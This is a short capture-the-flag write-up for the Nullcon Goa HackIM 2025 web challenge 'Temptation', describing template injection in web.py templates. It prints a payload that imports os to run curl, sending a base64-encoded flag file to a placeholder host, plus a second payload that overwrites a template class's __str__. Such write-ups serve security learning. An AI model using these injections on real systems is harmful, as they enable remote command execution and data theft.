---
title: "Temptation - Nullcon Goa HackIM 2025 CTF"
category: "web"
type: "writeup"
tags: ["web", "base64", "temptation", "nullcon-goa-hackim-2025-ctf", "2025", "ctf-writeup"]
summary: "As I was reading the docs, if we passed $min(1,2), it returned 1, this meant that some builtins were enabled."
source:
  name: "CTFtime writeup #39880"
  url: "https://ctftime.org/writeup/39880"
ctf:
  name: "Nullcon Goa HackIM 2025 CTF"
  year: 2025
  challenge: "Temptation"
---

## Metadata

- **CTF:** Nullcon Goa HackIM 2025 CTF
- **Task:** Temptation
- **Author team:** thehackerscrew
- **CTFtime:** <https://ctftime.org/writeup/39880>

---
As I was reading the [docs](<https://webpy.org/docs/0.3/api#web.template>), if we passed `$min(1,2)`, it returned 1, this meant that some builtins were enabled. And I tested and saw that `$__import__` was included so by a simple:  
```  
$__import__('os').system('curl+https://HOOK?c=`base64+/tmp/fla*.txt`')  
```  
would get the flag.  
That was probably unintended, the intended way  
```  
${[__import__('builtins').setattr(__import__('builtins').getattr(self,'__class__'),'__str__',lambda+x:"FLA\x47")]}  
```  
, which got the `web.template.TemplateResult` and overwrote it `__str__` to a lambda which returned "FLAG"
